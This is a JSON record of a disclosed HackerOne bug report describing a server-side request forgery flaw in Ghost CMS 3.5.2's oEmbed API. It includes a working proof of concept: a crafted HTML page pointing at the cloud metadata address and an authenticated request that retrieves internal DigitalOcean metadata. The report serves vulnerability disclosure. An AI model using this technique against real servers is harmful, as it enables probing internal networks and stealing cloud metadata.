@@ -1,0 +1,234 @@
+{
+  "id": 793704,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC83OTM3MDQ=",
+  "url": "https://hackerone.com/reports/793704",
+  "title": "Server-Side Request Forgery (SSRF) in Ghost CMS ",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2020-02-11T16:33:58.658Z",
+  "submitted_at": "2020-02-11T16:33:58.658Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "whoareme",
+    "url": "/whoareme",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/212jdq5mqcb6ryq16xv28rzsmehi/72249f83db42955adfcb43c5cad84162ec49002aa21a79c3606f682c8e48f4e6"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 23949,
+    "url": "https://hackerone.com/nodejs-ecosystem",
+    "handle": "nodejs-ecosystem",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./89f037b490baf3dcca1b84283f4c85141b64c213252a9c79b56c62bf903ab542"
+    },
+    "permissions": [],
+    "submission_state": "disabled",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Node.js third-party modules",
+      "twitter_handle": "",
+      "website": "https://nodejs.org/en/security/",
+      "about": "This program was used to handle vulnerabilities in the Node.js ecosystem."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2020-8134"
+  ],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2020-03-09T12:21:11.600Z",
+  "bug_reporter_agreed_on_going_public_at": "2020-03-09T12:21:11.526Z",
+  "team_member_agreed_on_going_public_at": "2020-03-09T12:11:23.352Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "I would like to report about SSRF vulnerability in CMS Ghost blog\n\nIt allows attacker able to send a crafted GET request from a vulnerable web application\n\n# Module\n\n**module name:** ghost\n**version:** 3.5.2\n**npm page:** `https://www.npmjs.com/package/ghost`\n**website page** `https://ghost.org/`\n\n## Module Description\n\nGhost is the world’s most popular open source headless Node.js CMS. \n\n## Module Stats\n\n4,812 weekly downloads\n\nThis CMS is used around 512,000 times for creating Blogs in 2018 according to Ghost statics. Currently the biggest customers of this blog are: Apple, Elon Musk's OpenAI team, Tinder, DigitalOcean, DuckDuckGo, Mozilla, Airtable, Revolt, etc.\n\n# Vulnerability\nAttacker with publisher role (editor, author, contributor, administrator) in a blog may be able to leverage this to make arbitrary GET requests in a CMS Ghost Blog instance's to internal / external network.\n\n## Vulnerability Description\nCMS Ghost allows publishers to set up embed content from many sources (like Youtube, Twitter, Instagram, etc).\nF713079\n\nWhen click you click on the “Other…” button you can see the following input.\nF713080\nThis input are send request to the route which is vulnerable for the SSRF attack. Let's discover it! \nWhen you try to pass some URL into this input we receive response like that:\n```\nGET /ghost/api/v3/admin/oembed/?url=http://169.254.169.254/metadata/v1.json&type=embed\n```\nF713081\nIn my case I trying to receive DigitalOcean MetaData from my server.\n\nBut, sadly In that moment we receive only validation error. That’s because responsible for that function [query()](https://github.com/TryGhost/Ghost/blob/master/core/server/api/canary/oembed.js#L145) doesn’t receive any content from function fetchOembedData().\n```javascript\nFile: /Ghost/core/server/api/canary/oembed.js\n\nmodule.exports = {\n    docName: 'oembed',\n    read: {\n        permissions: false,\n        data: [\n            'url',\n            'type'\n        ],\n        options: [],\n        query({data}) {\n            let {url, type} = data;\n\n            if (type === 'bookmark') {\n                return fetchBookmarkData(url);\n            }\n\n            return fetchOembedData(url).then((response) => {\n                if (!response && !type) {\n                    return fetchBookmarkData(url);\n                }\n                return response;\n            }).then((response) => {\n                if (!response) {\n                    return unknownProvider(url);\n                }\n                return response;\n            }).catch(() => {\n                return unknownProvider(url);\n            });\n        }\n    }\n};\n```\nIf we add breakpoint in fetchOembedData() function. And when will go across all lines of code in this function. We will notice interesting function that is call [getOembedUrlFromHTML()](https://github.com/TryGhost/Ghost/blob/master/core/server/api/canary/oembed.js#L109)\n```javascript\nFile: /Ghost/core/server/api/canary/oembed.js\n\nfunction fetchOembedData(url) {\n    let provider;\n    ({url, provider} = findUrlWithProvider(url));\n    if (provider) {\n        return knownProvider(url);\n    }\n    return request(url, {\n        method: 'GET',\n        timeout: 2 * 1000,\n        followRedirect: true,\n        headers: {\n            'user-agent': 'Ghost(https://github.com/TryGhost/Ghost)'\n        }\n    }).then((response) => {\n        if (response.url !== url) {\n            ({url, provider} = findUrlWithProvider(response.url));\n        }\n        if (provider) {\n            return knownProvider(url);\n        }\n        const oembedUrl = getOembedUrlFromHTML(response.body);\n        if (oembedUrl) {\n            return request(oembedUrl, {\n                method: 'GET',\n                json: true\n            }).then((response) => {\n                return response.body;\n            }).catch(() => {});\n        }\n    });\n}\n```\nThis [function](https://github.com/TryGhost/Ghost/blob/master/core/server/api/canary/oembed.js#L70) is responsible for getting oEmbed URL from external resources.\n```javascript\nFile: /Ghost/core/server/api/canary/oembed.js\n\nconst getOembedUrlFromHTML = (html) => {\n    return cheerio('link[type=\"application/json+oembed\"]', html).attr('href');\n};\n```\n>\"oEmbed is a format for allowing an embedded representation of a URL on third party sites. The simple API allows a website to display embedded content (such as photos or videos) when a user posts a link to that resource, without having to parse the resource directly.\"\n\nAnd here we can notice before and after executing getOembedUrlFromHTML() function don’t exist any validation which can prevent against from the SSRF attacks.  \n\n## Steps To Reproduce:\n\nCurrently, we know how we can bypass validation in vulnerable route and now we can easily create exploit for this.\n\nFirst of all, we should create an HTML page with  \"link[type=\"application/json+oembed”]” malicious URL which we would like to discover:\n ```\n<!DOCTYPE html>\n<html>\n<head>\n    <meta charset=\"UTF-8\">\n    <title>Security Testing</title>\n    <link rel=\"alternate\" type=\"application/json+oembed\" href=\"http://169.254.169.254/metadata/v1.json\"/>\n</head>\n<body></body>\n</html>\n```\n\nAnd serve this page by the Python SimpleHTTPServer module:\n \n```python -m SimpleHTTPServer 8000```\n\nIf your target is located in not your local network you can use ngrok library for creating a tunnel to your HTML page.\n \nAnd send the following request with publisher Cookies\n```\nGET /ghost/api/v3/admin/oembed/?url=http://169.254.169.254/metadata/v1.json&type=embed HTTP/1.1\nHost: YOUR_WEBSITE\nConnection: keep-alive\nAccept: application/json, text/javascript, */*; q=0.01\nX-Requested-With: XMLHttpRequest\nX-Ghost-Version: 3.5\nApp-Pragma: no-cache\nUser-Agent: Mozilla/5.0\nContent-Type: application/json; charset=UTF-8\nAccept-Encoding: gzip, deflate\nAccept-Language: en-US;\nCookie: ghost-admin-api-session=YOUR_SESSION\n```\nAnd we finally receive a response from the internal DigitalOcean service with my Droplet MetaData. \nSSRF vulnerability is working! 🥳\n\nF713098\n\n## Supporting Material/References:\n- OS: macOS current\n- Node.js: 10.15.2\n- NPM: 6.11.3\n\n# Wrap up\n\n- I contacted the maintainer to let them know: Yes\n- I opened an issue in the related repository: No\n\n## Impact\n\nAttacker with publisher role (editor, author, contributor, administrator) in a blog may be able to leverage this to make arbitrary GET requests in a Ghost Blog instance's to internal / external network.",
+  "weakness": {
+    "id": 68,
+    "name": "Server-Side Request Forgery (SSRF)"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 713079,
+      "file_name": "2020-02-11_17.06.04.jpg",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/8R6BtYCJ4Ci28myo5foMTcNe?response-content-disposition=attachment%3B%20filename%3D%222020-02-11_17.06.04.jpg%22%3B%20filename%2A%3DUTF-8%27%272020-02-11_17.06.04.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSKP6B35P%2F20260708%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260708T051238Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELX%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIAx739MYt9o%2FCzqqcjEGh7bc8LyuEzcyQSg0gBLQ0xJwAiEAsS6Yitb%2BXZLG6MrXSiDmr8rEsdQRGIWgZYcnO4RZvwIqsgUIfhADGgwwMTM2MTkyNzQ4NDkiDG%2FAay7ZzQmO4oSZuCqPBYxQDzUJXPpSGqKx0ZmcP5cjpjgAR7ZGqI5jM06T%2FwIlbAbqRe8I6Dvk1hCwN2I1866X3loYlwVG%2B3ezjPCauzfvhQ1InSqyscxaR5GoKEYMk5eYZTSeeYVBKz%2F1%2F40ZMDZKFFriBzktCZRTjMDhfv8raKB2LuyQJx3xLyBo5wev2JfEq3RoE8AEya03KG%2BHr8xny6giipS4JfIwPpu4mi4dYZOn4cZHAgT%2Fb0kv6U1tK42A4Gauuz4zo98cVOpidK46Ewr1yvccUZMejJfnm4NrhdJoIFlBcJJ%2BgI8hz%2BR255UHsMpruelxYxxni%2Fz2rpuIv49LkaSw7idE1NyyZj6kpIVbliddLrGaP5iBzOQtQdy1cOYfksk%2BT7%2BoNenRZuQwmcOneFMnuNbw7ZHS%2Bm8090eKDhetQGrwD16WGCCcCZtTYzJHTCb4tBfePn7WUWuBmOKU3w5rJv0nyCDaMyT%2FWiKPNlJVLqJP6voxT6AaPWHQF8eBJ%2FfzXrd6%2FmIyynNRc5KOqFnJlr%2FreR9KM6e5wWYP03fx%2F5Pas%2BU6QoPwnVCvlPCOE7WjcTj8NKLjJDeqKiOQNnnqC9EmsQ2pLhk7Z2SyKhXZvz9Ya9LUPjMpJTEjMe4uNr%2Fp8Fy6Y2yCSaBxol14KzPsIV55FxvpTuXIvuPEyclY%2BKUz9B3M0q7Xx%2Bvye5FygUwTz%2BmoiUIJwR8Y6YA%2FB%2B63FDW7v2p1dV12e6fRu0ZLV4mAmk6z42aJidcg8yp7q1hgY0Z5kt6Xz6FNq3FaksTwlDVOx%2FAOG4MHjgj%2BM1r1a%2B2GhEULAPAl4fzi7RidEVgIurF8PYG7UYLuuOTAbcn3EdsnwCOtTSUJHKIHgrBHUTDsD4%2BsMQUwgqy30gY6sQGdNtBYkNlstr4WOuYyzrAqDhYFD9rBL4SE9c6yXyaoS%2B70sZ2F7kycKRtO%2ByyZ5rilRPa8eE0rvXCgaXzb6P3LcOn7N8QI9abK7vmplRjS2FJIVFVhOsQbxUZqVXn7nJ4ZMELVvDIiLd%2B34uOdKJR1FmkpLRBG3aQ8Hljo1zpUF59R08IV10nKzawHIMclB5eHxO2xWFK9x4ocEsKweu6u4a1T3plTaHF7RKC%2BvPJUN1M%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=2e57a739b5ef86ae5ff739e6b90ad8fceaa42817736f5846c8e3f4f81feae4a0",
+      "file_size": 88145,
+      "type": "image/jpeg",
+      "moderated": null
+    },
+    {
+      "id": 713080,
+      "file_name": "2020-02-11_17.06.41.jpg",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/QXGSvBzFWe67r3pREuWmynY2?response-content-disposition=attachment%3B%20filename%3D%222020-02-11_17.06.41.jpg%22%3B%20filename%2A%3DUTF-8%27%272020-02-11_17.06.41.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSKP6B35P%2F20260708%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260708T051238Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELX%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIAx739MYt9o%2FCzqqcjEGh7bc8LyuEzcyQSg0gBLQ0xJwAiEAsS6Yitb%2BXZLG6MrXSiDmr8rEsdQRGIWgZYcnO4RZvwIqsgUIfhADGgwwMTM2MTkyNzQ4NDkiDG%2FAay7ZzQmO4oSZuCqPBYxQDzUJXPpSGqKx0ZmcP5cjpjgAR7ZGqI5jM06T%2FwIlbAbqRe8I6Dvk1hCwN2I1866X3loYlwVG%2B3ezjPCauzfvhQ1InSqyscxaR5GoKEYMk5eYZTSeeYVBKz%2F1%2F40ZMDZKFFriBzktCZRTjMDhfv8raKB2LuyQJx3xLyBo5wev2JfEq3RoE8AEya03KG%2BHr8xny6giipS4JfIwPpu4mi4dYZOn4cZHAgT%2Fb0kv6U1tK42A4Gauuz4zo98cVOpidK46Ewr1yvccUZMejJfnm4NrhdJoIFlBcJJ%2BgI8hz%2BR255UHsMpruelxYxxni%2Fz2rpuIv49LkaSw7idE1NyyZj6kpIVbliddLrGaP5iBzOQtQdy1cOYfksk%2BT7%2BoNenRZuQwmcOneFMnuNbw7ZHS%2Bm8090eKDhetQGrwD16WGCCcCZtTYzJHTCb4tBfePn7WUWuBmOKU3w5rJv0nyCDaMyT%2FWiKPNlJVLqJP6voxT6AaPWHQF8eBJ%2FfzXrd6%2FmIyynNRc5KOqFnJlr%2FreR9KM6e5wWYP03fx%2F5Pas%2BU6QoPwnVCvlPCOE7WjcTj8NKLjJDeqKiOQNnnqC9EmsQ2pLhk7Z2SyKhXZvz9Ya9LUPjMpJTEjMe4uNr%2Fp8Fy6Y2yCSaBxol14KzPsIV55FxvpTuXIvuPEyclY%2BKUz9B3M0q7Xx%2Bvye5FygUwTz%2BmoiUIJwR8Y6YA%2FB%2B63FDW7v2p1dV12e6fRu0ZLV4mAmk6z42aJidcg8yp7q1hgY0Z5kt6Xz6FNq3FaksTwlDVOx%2FAOG4MHjgj%2BM1r1a%2B2GhEULAPAl4fzi7RidEVgIurF8PYG7UYLuuOTAbcn3EdsnwCOtTSUJHKIHgrBHUTDsD4%2BsMQUwgqy30gY6sQGdNtBYkNlstr4WOuYyzrAqDhYFD9rBL4SE9c6yXyaoS%2B70sZ2F7kycKRtO%2ByyZ5rilRPa8eE0rvXCgaXzb6P3LcOn7N8QI9abK7vmplRjS2FJIVFVhOsQbxUZqVXn7nJ4ZMELVvDIiLd%2B34uOdKJR1FmkpLRBG3aQ8Hljo1zpUF59R08IV10nKzawHIMclB5eHxO2xWFK9x4ocEsKweu6u4a1T3plTaHF7RKC%2BvPJUN1M%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=49630c2dbf136c18c4e915a891c66103c58f03bdf88a9e8a51d9ed658374c1ad",
+      "file_size": 14189,
+      "type": "image/jpeg",
+      "moderated": null
+    },
+    {
+      "id": 713081,
+      "file_name": "2020-02-11_17.56.17.jpg",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/GGRKvEzhgCvMW6nYeGGkHkPZ?response-content-disposition=attachment%3B%20filename%3D%222020-02-11_17.56.17.jpg%22%3B%20filename%2A%3DUTF-8%27%272020-02-11_17.56.17.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSKP6B35P%2F20260708%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260708T051238Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELX%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIAx739MYt9o%2FCzqqcjEGh7bc8LyuEzcyQSg0gBLQ0xJwAiEAsS6Yitb%2BXZLG6MrXSiDmr8rEsdQRGIWgZYcnO4RZvwIqsgUIfhADGgwwMTM2MTkyNzQ4NDkiDG%2FAay7ZzQmO4oSZuCqPBYxQDzUJXPpSGqKx0ZmcP5cjpjgAR7ZGqI5jM06T%2FwIlbAbqRe8I6Dvk1hCwN2I1866X3loYlwVG%2B3ezjPCauzfvhQ1InSqyscxaR5GoKEYMk5eYZTSeeYVBKz%2F1%2F40ZMDZKFFriBzktCZRTjMDhfv8raKB2LuyQJx3xLyBo5wev2JfEq3RoE8AEya03KG%2BHr8xny6giipS4JfIwPpu4mi4dYZOn4cZHAgT%2Fb0kv6U1tK42A4Gauuz4zo98cVOpidK46Ewr1yvccUZMejJfnm4NrhdJoIFlBcJJ%2BgI8hz%2BR255UHsMpruelxYxxni%2Fz2rpuIv49LkaSw7idE1NyyZj6kpIVbliddLrGaP5iBzOQtQdy1cOYfksk%2BT7%2BoNenRZuQwmcOneFMnuNbw7ZHS%2Bm8090eKDhetQGrwD16WGCCcCZtTYzJHTCb4tBfePn7WUWuBmOKU3w5rJv0nyCDaMyT%2FWiKPNlJVLqJP6voxT6AaPWHQF8eBJ%2FfzXrd6%2FmIyynNRc5KOqFnJlr%2FreR9KM6e5wWYP03fx%2F5Pas%2BU6QoPwnVCvlPCOE7WjcTj8NKLjJDeqKiOQNnnqC9EmsQ2pLhk7Z2SyKhXZvz9Ya9LUPjMpJTEjMe4uNr%2Fp8Fy6Y2yCSaBxol14KzPsIV55FxvpTuXIvuPEyclY%2BKUz9B3M0q7Xx%2Bvye5FygUwTz%2BmoiUIJwR8Y6YA%2FB%2B63FDW7v2p1dV12e6fRu0ZLV4mAmk6z42aJidcg8yp7q1hgY0Z5kt6Xz6FNq3FaksTwlDVOx%2FAOG4MHjgj%2BM1r1a%2B2GhEULAPAl4fzi7RidEVgIurF8PYG7UYLuuOTAbcn3EdsnwCOtTSUJHKIHgrBHUTDsD4%2BsMQUwgqy30gY6sQGdNtBYkNlstr4WOuYyzrAqDhYFD9rBL4SE9c6yXyaoS%2B70sZ2F7kycKRtO%2ByyZ5rilRPa8eE0rvXCgaXzb6P3LcOn7N8QI9abK7vmplRjS2FJIVFVhOsQbxUZqVXn7nJ4ZMELVvDIiLd%2B34uOdKJR1FmkpLRBG3aQ8Hljo1zpUF59R08IV10nKzawHIMclB5eHxO2xWFK9x4ocEsKweu6u4a1T3plTaHF7RKC%2BvPJUN1M%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=1a8bd24b16bb3e66c4fd003e8f7dc4e37346ccd3bece21305f74eb70fec58e21",
+      "file_size": 120399,
+      "type": "image/jpeg",
+      "moderated": null
+    },
+    {
+      "id": 713098,
+      "file_name": "2020-02-11_17.07.09.jpg",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/uhMWrcSeLT9gmA25QFQK5okF?response-content-disposition=attachment%3B%20filename%3D%222020-02-11_17.07.09.jpg%22%3B%20filename%2A%3DUTF-8%27%272020-02-11_17.07.09.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSKP6B35P%2F20260708%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260708T051238Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELX%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIAx739MYt9o%2FCzqqcjEGh7bc8LyuEzcyQSg0gBLQ0xJwAiEAsS6Yitb%2BXZLG6MrXSiDmr8rEsdQRGIWgZYcnO4RZvwIqsgUIfhADGgwwMTM2MTkyNzQ4NDkiDG%2FAay7ZzQmO4oSZuCqPBYxQDzUJXPpSGqKx0ZmcP5cjpjgAR7ZGqI5jM06T%2FwIlbAbqRe8I6Dvk1hCwN2I1866X3loYlwVG%2B3ezjPCauzfvhQ1InSqyscxaR5GoKEYMk5eYZTSeeYVBKz%2F1%2F40ZMDZKFFriBzktCZRTjMDhfv8raKB2LuyQJx3xLyBo5wev2JfEq3RoE8AEya03KG%2BHr8xny6giipS4JfIwPpu4mi4dYZOn4cZHAgT%2Fb0kv6U1tK42A4Gauuz4zo98cVOpidK46Ewr1yvccUZMejJfnm4NrhdJoIFlBcJJ%2BgI8hz%2BR255UHsMpruelxYxxni%2Fz2rpuIv49LkaSw7idE1NyyZj6kpIVbliddLrGaP5iBzOQtQdy1cOYfksk%2BT7%2BoNenRZuQwmcOneFMnuNbw7ZHS%2Bm8090eKDhetQGrwD16WGCCcCZtTYzJHTCb4tBfePn7WUWuBmOKU3w5rJv0nyCDaMyT%2FWiKPNlJVLqJP6voxT6AaPWHQF8eBJ%2FfzXrd6%2FmIyynNRc5KOqFnJlr%2FreR9KM6e5wWYP03fx%2F5Pas%2BU6QoPwnVCvlPCOE7WjcTj8NKLjJDeqKiOQNnnqC9EmsQ2pLhk7Z2SyKhXZvz9Ya9LUPjMpJTEjMe4uNr%2Fp8Fy6Y2yCSaBxol14KzPsIV55FxvpTuXIvuPEyclY%2BKUz9B3M0q7Xx%2Bvye5FygUwTz%2BmoiUIJwR8Y6YA%2FB%2B63FDW7v2p1dV12e6fRu0ZLV4mAmk6z42aJidcg8yp7q1hgY0Z5kt6Xz6FNq3FaksTwlDVOx%2FAOG4MHjgj%2BM1r1a%2B2GhEULAPAl4fzi7RidEVgIurF8PYG7UYLuuOTAbcn3EdsnwCOtTSUJHKIHgrBHUTDsD4%2BsMQUwgqy30gY6sQGdNtBYkNlstr4WOuYyzrAqDhYFD9rBL4SE9c6yXyaoS%2B70sZ2F7kycKRtO%2ByyZ5rilRPa8eE0rvXCgaXzb6P3LcOn7N8QI9abK7vmplRjS2FJIVFVhOsQbxUZqVXn7nJ4ZMELVvDIiLd%2B34uOdKJR1FmkpLRBG3aQ8Hljo1zpUF59R08IV10nKzawHIMclB5eHxO2xWFK9x4ocEsKweu6u4a1T3plTaHF7RKC%2BvPJUN1M%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=fc10f070504a2638fa7170c7786d8a897258cb3d06e0211e984b609615cd54c5",
+      "file_size": 82168,
+      "type": "image/jpeg",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2020-04-08T12:11:23.457Z",
+  "allow_singular_disclosure_after": -197139674.5888115,
+  "singular_disclosure_allowed": true,
+  "vote_count": 42,
+  "voters": [
+    "taha",
+    "whoareme",
+    "7urb0",
+    "ermilov",
+    "n1m0",
+    "a_d_a_m",
+    "cdl",
+    "tess",
+    "tuo4n8",
+    "mik317",
+    "and 32 more..."
+  ],
+  "severity": {
+    "rating": "medium",
+    "score": 4.4,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "high",
+      "privileges_required": "high",
+      "user_interaction": "none",
+      "scope": "unchanged",
+      "confidentiality": "high",
+      "integrity": "none",
+      "availability": "none"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 49350,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "Ghost",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ],
+  "databaseId": "793704",
+  "votes": 42,
+  "latest_disclosable_activity_at": "2020-03-09T12:21:11.624Z",
+  "_metadata": {
+    "saved_at": "2026-07-08T13:12:38.159401",
+    "source": "https://hackerone.com/reports/793704.json",
+    "report_id": 793704
+  },
+  "_graphql_detail": {
+    "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC83OTM3MDQ=",
+    "databaseId": "793704",
+    "title": "Server-Side Request Forgery (SSRF) in Ghost CMS ",
+    "url": "https://hackerone.com/reports/793704",
+    "state": null,
+    "substate": "resolved",
+    "disclosed_at": "2020-03-09T12:21:11.600Z",
+    "created_at": "2020-02-11T16:33:58.658Z",
+    "submitted_at": null,
+    "weakness": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1dlYWtuZXNzLzY4",
+      "name": "Server-Side Request Forgery (SSRF)",
+      "external_id": "cwe-918"
+    },
+    "severity": {
+      "rating": "medium",
+      "score": 4.4
+    },
+    "reporter": {
+      "username": "whoareme"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzIzOTQ5",
+      "handle": "nodejs-ecosystem",
+      "name": "Node.js third-party modules",
+      "url": "https://hackerone.com/nodejs-ecosystem",
+      "currency": "usd"
+    },
+    "bounties": {
+      "edges": []
+    }
+  },
+  "_hacktivity": {
+    "__typename": "HacktivityDocument",
+    "id": "Z2lkOi8vaGFja2Vyb25lL0NvbXBsZXRlSGFja3Rpdml0eVJlcG9ydEluZGV4Lzc5MzcwNA==",
+    "_id": "793704",
+    "disclosed": true,
+    "votes": 42,
+    "latest_disclosable_activity_at": "2020-03-09T12:21:11.624Z",
+    "report": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC83OTM3MDQ=",
+      "databaseId": "793704",
+      "title": "Server-Side Request Forgery (SSRF) in Ghost CMS ",
+      "url": "https://hackerone.com/reports/793704",
+      "disclosed_at": "2020-03-09T12:21:11.600Z"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzIzOTQ5",
+      "handle": "nodejs-ecosystem",
+      "name": "Node.js third-party modules",
+      "url": "https://hackerone.com/nodejs-ecosystem",
+      "currency": "usd"
+    }
+  }
+}
